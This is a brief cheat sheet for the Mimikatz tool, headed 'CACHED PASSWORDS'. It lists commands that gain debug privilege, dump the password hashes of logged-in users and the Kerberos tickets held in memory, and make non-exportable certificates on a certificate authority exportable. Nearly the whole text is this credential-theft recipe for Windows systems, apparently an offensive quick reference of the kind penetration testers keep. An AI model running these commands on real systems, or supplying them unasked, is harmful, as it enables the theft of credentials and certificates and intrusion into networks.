# CACHED PASSWORDS
#mimikatz
```
# CACHED PASSWORDS
privilege::debug

# dump hashes of logged in users
sekurlsa::logonpasswords

# show tickets in memory
sekurlsa::tickets

# fix non exportable certs on CA
crypto::capi
KeyIso
```
